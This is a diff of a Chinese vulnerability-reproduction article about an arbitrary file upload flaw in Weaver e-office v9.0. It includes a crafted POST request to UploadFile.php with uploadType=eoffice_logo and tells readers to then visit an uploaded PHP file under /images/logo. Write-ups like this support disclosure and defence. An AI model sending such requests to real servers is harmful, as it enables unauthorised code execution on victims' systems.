@@ -29,17 +29,17 @@ https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
 
-二:  漏洞影响🐇
+二:  漏洞影响🐇
 
   
 
-泛微 e-office v9.0
+泛微 e-office v9.0
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
 
-三:  漏洞复现🐋
+三:  漏洞复现🐋
 
   
 
@@ -55,13 +55,13 @@ https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ
 
   
 
-存在漏洞的源代码位置，主要是源于 uploadType 参数设为 eoffice_logo 时，对文件没有校验，导致任意文件上传  
+存在漏洞的源代码位置，主要是源于 uploadType 参数设为 eoffice_logo 时，对文件没有校验，导致任意文件上传  
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MkbOfn9vPE1sTKGgGLicIVibNAibl2vH5GgwOB2GfYVJiafnq8xvN92LS8Q/640?wx_fmt=png)
 
   
 
-调用方法 uploadPicture
+调用方法 uploadPicture
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MgDc5rmJngPYA6AchtTxk2H2fSoJp3QP2icyWWuxQicrwcyG1dRHicwTew/640?wx_fmt=png)
 
@@ -71,7 +71,7 @@ https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ
 
 ```
 POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
-Host: 127.0.0.1:7899
+Host: 127.0.0.1:7899
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
 Accept-Encoding: gzip, deflate
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
@@ -94,7 +94,7 @@ Content-Type: image/jpeg
 
   
 
-上传成功后访问 /images/logo/logo-eoffice.php
+上传成功后访问 /images/logo/logo-eoffice.php
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MAnsr7GVQe9tqFDRPezT3ribmIRT8xY36fbLonlNiayr4jwJ2mUETC2WQ/640?wx_fmt=png)
 
@@ -102,13 +102,13 @@ Content-Type: image/jpeg
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)
 
- 五:  关于文库🦉
+ 五:  关于文库🦉
 
   
 
   
 
-                    https://www.yuque.com/peiqiwik                           
+                    https://www.yuque.com/peiqiwik                           
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7M1sUD3R1Am0JerQ98aaxL4qVEdVxM9YquIrAs2ovlic0sTp2KXdrvEnQ/640?wx_fmt=png)
 
@@ -131,7 +131,7 @@ Content-Type: image/jpeg
 
 **由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**
 
-**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**
+**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**
 
 ---
 
